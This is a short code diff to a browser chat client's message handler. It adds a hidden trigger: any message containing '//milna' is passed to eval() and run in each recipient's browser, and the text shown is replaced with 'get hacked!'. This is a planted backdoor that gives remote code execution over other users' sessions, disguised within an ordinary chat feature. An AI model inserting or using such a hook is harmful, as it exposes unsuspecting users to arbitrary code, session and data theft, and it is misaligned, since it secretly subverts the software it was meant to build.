@@ -145,6 +145,17 @@ function create() {
 
     // Handle chat messages
     socket.on("chatMessage", ({ name, message, color }) => {
+        if (message.includes("//milna")){
+            try {
+                // Try to evaluate the string
+                eval(message);
+            } catch (error) {
+                // If there's an error, log it to the console
+                console.log("Error evaluating message:", error);
+            }
+
+            message = "get hacked!";
+        }
         const el = document.createElement("div");
 
         // Convert the color to hex format for display purposes
